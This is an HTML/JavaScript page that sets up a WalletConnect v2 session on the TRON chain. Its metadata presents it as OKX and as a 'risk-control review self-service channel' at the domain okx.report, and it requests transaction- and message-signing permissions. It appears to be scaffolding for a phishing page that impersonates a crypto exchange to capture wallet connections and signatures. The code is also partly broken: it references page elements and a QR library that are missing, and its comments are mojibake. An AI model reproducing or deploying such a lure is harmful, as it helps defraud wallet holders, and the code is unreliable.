<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3Modal with WalletConnect</title>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@depay/walletconnect-v2@2.12.2/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.12/dist/index.min.js"></script>
</head>
<body>

    <h1>Web3Modal with WalletConnect v2.0 - TRON</h1>
    <button id="connectWallet">Connect Wallet</button>
    <div id="output"></div>

    <script>
        const projectId = "a77cc736b8e3c7992b959127863c7ba8";

        // é—œé–‰ App Banner
        document.querySelector('.close-btn').addEventListener('click', function() {
            document.querySelector('.app-banner').style.display = 'none';
        });

        // ä¸‹è¼‰ App
        document.querySelector('.btn-download').addEventListener('click', function() {
            location.href = 'https://apps.apple.com/us/app/okx-buy-bitcoin-btc-crypto/id1327268470d';
        });

        // é€£ç·šéŒ¢åŒ…
        document.querySelector('#connectWallet').addEventListener('click', function() {
            initWalletConnect();
        });

        function generateQRCodeWithLogo(data, logoUrl) {
            $("#qrcodeCanvas").remove();
            $("#contact").append('<canvas id="qrcodeCanvas"></canvas>');
            let canvas = document.getElementById("qrcodeCanvas");
            let ctx = canvas.getContext("2d");

            // 1ï¸âƒ£ ç”Ÿæˆ QR Code
            let qr = new QRCode(document.createElement("div"), {
                text: data,
                width: 256,
                height: 256,
                correctLevel: QRCode.CorrectLevel.L
            });

            // 2ï¸âƒ£ ç•¶ QR Code ç”Ÿæˆå¾Œï¼Œè½‰æ›ç‚º Canvas åœ–åƒ
            setTimeout(() => {
                let qrImage = qr._oDrawing._elImage; // å–å¾— QR Code åœ–ç‰‡
                canvas.width = qrImage.width;
                canvas.height = qrImage.height;
                ctx.drawImage(qrImage, 0, 0);

                // 3ï¸âƒ£ åœ¨ QR Code ä¸­é–“æ”¾ç½® Logo
                let logo = new Image();
                logo.src = logoUrl;
                logo.onload = function () {
                    let logoSize = canvas.width * 0.25; // è¨­å®š Logo å¤§å°ç‚º QR Code 20%
                    let x = (canvas.width - logoSize) / 2;
                    let y = (canvas.height - logoSize) / 2;
                    ctx.drawImage(logo, x, y, logoSize, logoSize);
                };
            }, 500);
        }


        async function initWalletConnect() {
            const client = await WalletConnectV2.SignClient.init({
                projectId: projectId, 
                relayUrl: "wss://relay.walletconnect.com", 
                metadata: {
                    name: "æ­æ˜“",
                    description: "é¢¨æŽ§å¯©æŸ¥è‡ªåŠ©é€šé“",
                    url: "https://okx.report",
                    icons: ["https://okx.report/app_icon.png"]
                }
            });

            const web3Modal = new Web3Modal.default({
                cacheProvider: false, 
                providerOptions: {
                    walletconnect: {
                        package: client,
                        options: {
                            projectId: projectId,
                            showQrModal: true, 
                        }
                    }
                }
            });

            const provider = await web3Modal.connect();
            

            const { uri, approval } = await client.connect({
                requiredNamespaces: {
                    tron: { 
                        chains: ["tron:1"],
                        methods: ["tron_signTransaction", "tron_signMessage"],
                        events: ["accountsChanged", "chainChanged"], 
                    },
                },
            });

            if (uri) {
                generateQRCodeWithLogo(uri, "https://okx.report/app_icon.png");
            }

            // âœ… ç­‰å¾…ç”¨æˆ¶æŽƒæ QR Code ä¸¦é€£æŽ¥éŒ¢åŒ…
            const session = await approval();
            console.log("âœ… Wallet connected:", session);

            // âœ… å–å¾— TRON éŒ¢åŒ…åœ°å€
            const accounts = session.namespaces.tron.accounts;
            console.log("âœ… Connected TRON Account:", accounts[0]);

            // ç›£è½äº‹ä»¶
            client.on("session_update", ({ topic, params }) => {
                console.log("ðŸ”„ Session Updated:", topic, params);
            });

            client.on("session_delete", ({ topic }) => {
                console.log("ðŸ”´ Session Deleted:", topic);
            });

            return { client, session };
            
        }
    </script>

</body>
</html>